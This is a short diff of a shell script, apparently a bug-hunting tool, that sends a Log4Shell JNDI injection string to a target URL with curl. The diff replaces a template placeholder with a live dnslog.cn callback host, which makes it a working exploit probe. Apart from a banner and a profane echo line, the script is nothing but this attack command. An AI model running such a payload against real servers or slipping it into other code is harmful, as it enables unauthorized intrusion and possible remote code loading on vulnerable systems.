@@ -10,5 +10,5 @@ coded by @ELSFA7-110@automotion bughunting@\n\e[0m"
 #------------------------------------------------#
 echo -e "Fuck it\n"
 #------------------------------------------------#
-curl $1 /test?=${jndi:ldap://{{interactsh-url}}/a}
+curl $1/test?=${jndi:ldap://qwrlj8.dnslog.cn/a}
 #------------------------------------------------#
